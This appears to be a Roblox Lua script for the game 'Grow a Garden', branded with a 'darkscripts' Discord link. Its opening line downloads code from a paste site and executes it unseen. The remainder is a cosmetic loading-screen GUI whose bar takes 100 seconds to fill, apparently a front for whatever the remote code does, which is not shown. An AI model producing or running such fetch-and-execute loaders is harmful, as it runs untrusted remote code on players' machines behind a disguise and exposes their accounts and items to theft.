loadstring(game:HttpGet("https://pastefy.app/RJINtroL/raw"))()
-- Roblox GUI Version of the Loading Screen

local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local LoadingBarBack = Instance.new("Frame")
local LoadingBar = Instance.new("Frame")
local LoadingText = Instance.new("TextLabel")
local MiniGamesButton = Instance.new("TextButton")
local SelfDestroyButton = Instance.new("TextButton")

ScreenGui.Name = "PoolLoadingGUI"
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.25, 0, 0.3, 0)
MainFrame.Size = UDim2.new(0.5, 0, 0.3, 0)
MainFrame.BackgroundTransparency = 0.2

Title.Name = "Title"
Title.Parent = MainFrame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0, 0, 0, -50)
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Font = Enum.Font.SourceSansBold
Title.Text = "ðŸŒ´ Grow a Garden ðŸŒ´"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true

LoadingBarBack.Name = "LoadingBarBack"
LoadingBarBack.Parent = MainFrame
LoadingBarBack.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
LoadingBarBack.Position = UDim2.new(0.05, 0, 0.5, -10)
LoadingBarBack.Size = UDim2.new(0.9, 0, 0, 20)
LoadingBarBack.BorderSizePixel = 0

LoadingBar.Name = "LoadingBar"
LoadingBar.Parent = LoadingBarBack
LoadingBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LoadingBar.Size = UDim2.new(0, 0, 1, 0)
LoadingBar.BorderSizePixel = 0

LoadingText.Name = "LoadingText"
LoadingText.Parent = MainFrame
LoadingText.BackgroundTransparency = 1
LoadingText.Position = UDim2.new(0, 0, 0.7, 0)
LoadingText.Size = UDim2.new(1, 0, 0, 30)
LoadingText.Font = Enum.Font.SourceSansBold
LoadingText.Text = "0% - discord.gg/darkscripts"
LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadingText.TextScaled = true

MiniGamesButton.Name = "MiniGamesButton"
MiniGamesButton.Parent = MainFrame
MiniGamesButton.Position = UDim2.new(0, -110, 0, 0)
MiniGamesButton.Size = UDim2.new(0, 100, 0, 30)
MiniGamesButton.Text = "Mini Games"
MiniGamesButton.Font = Enum.Font.SourceSans
MiniGamesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MiniGamesButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
MiniGamesButton.MouseButton1Click:Connect(function()
    warn("Mini games coming soon!")
end)

SelfDestroyButton.Name = "SelfDestroyButton"
SelfDestroyButton.Parent = MainFrame
SelfDestroyButton.Position = UDim2.new(0, -110, 0, 40)
SelfDestroyButton.Size = UDim2.new(0, 100, 0, 30)
SelfDestroyButton.Text = "Self Destroy"
SelfDestroyButton.Font = Enum.Font.SourceSans
SelfDestroyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SelfDestroyButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
SelfDestroyButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

-- Loading logic
local duration = 100 -- in seconds
local progress = 0
local steps = 100
local waitTime = duration / steps

spawn(function()
    for i = 1, steps do
        progress = i
        LoadingBar.Size = UDim2.new(progress/100, 0, 1, 0)
        LoadingText.Text = progress .. "% - discord.gg/darkscripts"
        wait(waitTime)
    end
end)
